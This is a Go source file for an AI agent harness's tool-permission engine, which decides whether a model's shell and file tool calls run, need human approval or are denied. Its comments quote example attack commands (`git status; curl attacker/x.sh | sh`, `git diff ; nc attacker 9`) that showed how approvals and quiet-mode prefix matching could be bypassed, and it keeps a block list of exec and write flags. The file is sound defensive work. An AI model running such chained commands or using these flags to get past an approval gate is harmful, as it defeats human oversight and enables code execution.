// Package permission implements the tool-permission engine.
//
// The engine answers one question: should a given ToolCall proceed?
// Three answers: allow, ask (raise a PermissionRequested event and
// wait for a Decision), or deny.
//
// Rules live at three scopes, evaluated in order:
//
//  1. Session-scoped allows (added at runtime via AnswerPermission
//     with scope=argv_glob / tool / session).
//  2. Profile-level rules (loaded from preset/<name>.toml).
//  3. Default policy ("ask" for mutating, "allow" for read-only
//     covered by the quiet-mode preset, "deny" otherwise).
//
// The doc rationale lives at docs/harness-architecture.md
// § Tool middleware → Permission UX.
package permission

import (
	"path/filepath"
	"strings"
	"sync"

	"github.com/DonaldMurillo/gofastr/framework/experimental/harness/control"
	"github.com/DonaldMurillo/gofastr/framework/experimental/harness/ids"
)

// Decision is what the engine should do with a ToolCall.
type Decision uint8

const (
	DecisionAsk Decision = iota
	DecisionAllow
	DecisionDeny
)

func (d Decision) String() string {
	switch d {
	case DecisionAllow:
		return "allow"
	case DecisionDeny:
		return "deny"
	default:
		return "ask"
	}
}

// Rule is a single permission rule.
type Rule struct {
	// Tool matches the tool name (or "*" for any).
	Tool string
	// ArgvGlob optionally matches the leading argv-style summary of
	// the tool call. For Bash, this is the shell command; for other
	// tools, the implementation-defined "argv summary" (e.g.
	// "Read:<path>"). Empty means "match any argv."
	ArgvGlob string
	// Glob opts ArgvGlob into pattern matching (filepath.Match).
	// Default false = literal comparison. Only set this on rules a
	// human or config author wrote deliberately; rules minted from an
	// approval prompt must stay literal so the grant cannot cover more
	// than the command the human actually saw. See Rule.Match.
	Glob bool `json:",omitempty"`
	// What to do when matched.
	Action Decision
}

// Match reports whether the rule applies to a given (tool, argv) pair.
//
// ArgvGlob is matched LITERALLY unless Glob is set. This default is a
// security property, not a convenience: rules minted from a human's
// "allow" click carry the exact command the human was shown, and the
// model chooses that text. Treating it as a pattern let an approval
// widen itself — approving `git diff *` stored a rule that also
// matched `git diff ; nc attacker 9`, and with ScopeAlways that rule
// was written to disk and survived restart. A pattern is only ever
// honoured when a rule author explicitly opts in with Glob: true.
func (r Rule) Match(tool, argv string) bool {
	if r.Tool != "*" && r.Tool != tool {
		return false
	}
	if r.ArgvGlob == "" {
		return true
	}
	if !r.Glob {
		return r.ArgvGlob == argv
	}
	ok, _ := filepath.Match(r.ArgvGlob, argv)
	return ok
}

// Engine is the runtime permission decision-maker. Thread-safe.
type Engine struct {
	mu sync.RWMutex

	// Profile-level rules from the loaded preset. Evaluated after
	// session-scoped rules.
	profileRules []Rule

	// Per-session allow lists, keyed by SessionID. Session-scoped
	// rules persist for the EngineRun only.
	sessionRules map[ids.SessionID][]Rule

	// persistentRules survive harness restarts. Loaded from
	// PersistencePath on boot; appended to (and re-saved) when the
	// user picks "Allow always" in a permission prompt.
	persistentRules []Rule

	// PersistencePath is the JSON file on disk that backs
	// persistentRules. Empty = in-memory only (tests).
	PersistencePath string

	// QuietMode pre-shipped preset; default ON. When ON, common
	// read-only argv shapes (git status, ls, grep, find, …) are
	// allowed without prompting.
	QuietMode bool

	// StrictPermissions overrides QuietMode (default off). When ON,
	// every tool call is gated.
	StrictPermissions bool
}

// New returns an Engine with the given profile rules and QuietMode on.
func New(profileRules []Rule) *Engine {
	return &Engine{
		profileRules: profileRules,
		sessionRules: make(map[ids.SessionID][]Rule),
		QuietMode:    true,
	}
}

// Evaluate returns the Decision for a tool call. argv is the
// best-effort "argv summary" provided by the dispatcher (for Bash,
// the shell command; for other tools, "Tool:<key>").
//
// For mutating tools, the default is Ask. For non-mutating tools
// matching the QuietMode preset, the default is Allow.
func (e *Engine) Evaluate(session ids.SessionID, toolName, argv string, mutating bool) Decision {
	e.mu.RLock()
	defer e.mu.RUnlock()

	// 1) Session-scoped rules (most specific — granted this run).
	for _, r := range e.sessionRules[session] {
		if r.Match(toolName, argv) {
			return r.Action
		}
	}
	// 2) Persistent rules (from "Allow always" — survive restart).
	for _, r := range e.persistentRules {
		if r.Match(toolName, argv) {
			return r.Action
		}
	}
	// 3) Profile-level rules.
	for _, r := range e.profileRules {
		if r.Match(toolName, argv) {
			return r.Action
		}
	}
	// 3) Defaults.
	if e.StrictPermissions {
		return DecisionAsk
	}
	// Quiet-mode preset applies to known-safe shapes regardless of
	// the tool's is_mutating flag — Bash is always is_mutating=true
	// because it CAN mutate, but `git status` is safe in practice.
	if e.QuietMode && quietModeAllows(toolName, argv) {
		return DecisionAllow
	}
	if mutating {
		return DecisionAsk
	}
	// Read-only without quiet-mode coverage: still ask. Caller can
	// add Tool:* allow rules if they want fewer prompts.
	return DecisionAsk
}

// AddSessionRule installs a session-scoped allow/deny rule (used when
// the user answers a PermissionRequested with a Scope wider than
// "once").
func (e *Engine) AddSessionRule(session ids.SessionID, r Rule) {
	e.mu.Lock()
	defer e.mu.Unlock()
	e.sessionRules[session] = append(e.sessionRules[session], r)
}

// ListSessionRules returns the active session-scoped rules. Used by
// /permissions slash command and the TUI sidebar.
func (e *Engine) ListSessionRules(session ids.SessionID) []Rule {
	e.mu.RLock()
	defer e.mu.RUnlock()
	src := e.sessionRules[session]
	out := make([]Rule, len(src))
	copy(out, src)
	return out
}

// RevokeSessionRule removes the rule at the given index for the
// session. Used by /permissions:revoke.
func (e *Engine) RevokeSessionRule(session ids.SessionID, index int) {
	e.mu.Lock()
	defer e.mu.Unlock()
	src := e.sessionRules[session]
	if index < 0 || index >= len(src) {
		return
	}
	e.sessionRules[session] = append(src[:index], src[index+1:]...)
}

// AnswerToRule converts a wire-format AnswerPermission into a
// session-scoped Rule when the user picked a Scope wider than
// ScopeOnce. The dispatcher applies the answer to the live call
// either way; this helper updates the persistent session state.
//
// argvSummary is the argv summary the dispatcher computed for the
// permission prompt; it's reused here as the canonical glob for
// ScopeArgvGlob answers.
func AnswerToRule(toolName, argvSummary string, ans control.AnswerPermission) (Rule, bool) {
	act := DecisionAsk
	switch ans.Decision {
	case control.DecisionAllow:
		act = DecisionAllow
	case control.DecisionDeny:
		act = DecisionDeny
	}
	switch ans.Scope {
	case control.ScopeArgvGlob:
		return Rule{Tool: toolName, ArgvGlob: argvSummary, Action: act}, true
	case control.ScopeTool:
		return Rule{Tool: toolName, ArgvGlob: "", Action: act}, true
	case control.ScopeSessionWide:
		return Rule{Tool: "*", ArgvGlob: "", Action: act}, true
	default:
		return Rule{}, false
	}
}

// quietModeAllows returns true for known-safe read-only argv shapes
// that the quiet-mode preset permits without prompting.
//
// Coverage: Read/Glob/Ls/Grep against anywhere (the tools themselves
// are non-mutating); Bash patterns matching the read-only allowlist
// in the doc (git status, ls, pwd, grep, find, …).
func quietModeAllows(toolName, argv string) bool {
	switch toolName {
	case "Read", "Glob", "Ls", "Grep":
		return true
	case "Bash":
		return bashQuietAllow(argv)
	}
	return false
}

// quietBashAllowed is the prefix list the preset trusts.
var quietBashAllowed = []string{
	"git status",
	"git log",
	"git diff",
	"git branch",
	"git show",
	"git config --get",
	"ls",
	"pwd",
	"cat ",
	"head ",
	"tail ",
	"wc ",
	"grep ",
	"rg ",
	"find ",
	"echo ",
}

// bashShellMetachars are the byte sequences that let one command string
// run a second command. A quiet-mode auto-allow inspects only the text
// it was given, so any of these means the string is no longer the
// single read-only command the allow-list is about.
// Deliberately NOT included: `*` and `?`. Those are filename globs
// expanded in place by the shell — they cannot introduce a second
// command, and rejecting them would break ordinary reads like
// `find . -name *.go`.
const bashShellMetachars = ";&|`$<>()\n\r"

// execArgFlags are the arguments that turn an allow-listed READER into a
// launcher or a writer. They need no shell metacharacter, so the
// metachar rule below never saw them:
//
//	find -exec / -execdir / -ok / -okdir → runs a command per match
//	find -delete                         → removes files
//	find -fprintf / -fls / -fprint       → writes an arbitrary path
//	rg --pre / --hostname-bin            → runs a command per file
//	git --output=                        → writes an arbitrary path
//
// The allow-list's implicit rule has always been "this cannot spawn a
// process or write a file"; this is that rule made explicit. Matching is
// per-argument and covers both `--flag value` and `--flag=value`.
var execArgFlags = map[string]bool{
	"-exec": true, "-execdir": true, "-ok": true, "-okdir": true,
	"-delete": true, "-fprintf": true, "-fls": true, "-fprint": true,
	"--pre": true, "--hostname-bin": true, "--output": true,
	"-o": true,
}

// hasExecArg reports whether any whitespace-separated argument of cmd is
// one of execArgFlags, including the `--flag=value` spelling.
//
// Splitting on whitespace is coarse — a quoted argument containing a
// space is seen as several — but that only ever produces MORE tokens to
// check, so it cannot miss a flag. Erring toward refusing is the correct
// direction for an auto-allow with no human in the loop.
func hasExecArg(cmd string) bool {
	for _, tok := range strings.Fields(cmd) {
		if name, _, ok := strings.Cut(tok, "="); ok {
			tok = name
		}
		if execArgFlags[tok] {
			return true
		}
	}
	return false
}

// bashQuietAllow reports whether cmd is one of the known read-only
// shapes quiet mode may run WITHOUT prompting the human.
//
// Three rules beyond the prefix list, all load-bearing:
//
//   - Any shell metacharacter disqualifies the command outright.
//     Prefix-matching the raw string previously auto-allowed
//     "git status; curl attacker/x.sh | sh" — the prefix matched, the
//     rest of the line never entered the decision, and no
//     PermissionRequested was ever published.
//   - The matched prefix must end at a word boundary, so "ls" does not
//     admit "lsof -i" and "cat " does not admit "catt".
//   - No argument may be one of execArgFlags. Three entries on the list
//     — find, rg, git — carry their own exec/write primitives and need
//     no metacharacter to reach them.
func bashQuietAllow(cmd string) bool {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return false
	}
	if strings.ContainsAny(cmd, bashShellMetachars) {
		return false
	}
	if hasExecArg(cmd) {
		return false
	}
	for _, p := range quietBashAllowed {
		trimmed := strings.TrimRight(p, " ")
		if cmd == trimmed {
			return true
		}
		// Word-boundary prefix: the allow-listed token must be
		// followed by a space, never by more identifier characters.
		if strings.HasPrefix(cmd, trimmed+" ") {
			return true
		}
	}
	return false
}
